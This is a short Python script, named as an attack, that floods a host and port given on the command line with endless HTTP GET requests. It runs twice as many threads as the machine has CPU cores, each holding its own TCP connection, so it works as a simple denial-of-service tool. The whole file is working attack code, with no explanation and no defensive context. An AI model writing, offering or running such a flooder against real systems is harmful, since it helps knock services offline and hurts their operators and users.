#!/usr/bin/env python3

from socket import socket, AF_INET, SOCK_STREAM
from threading import Thread
from multiprocessing import cpu_count
import sys

def attack(host, port, num):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect((host, port))

    while True:
        print('Thread {} : Sending request to {}:{}...'.format(num, host, port))
        s.send(
            (
                'GET / HTTP/1.1\r\n'
                'Host: {}\r\n'.format(host) +
                '\r\n'
            ).encode('utf-8')
        )

if __name__ == '__main__':
    host = sys.argv[1]
    try:
        port = int(sys.argv[2])
    except (IndexError, ValueError):
        port = 80

    for i in range(cpu_count() * 2):
        t = Thread(target=attack, args=(host, port, i + 1))
        t.start()
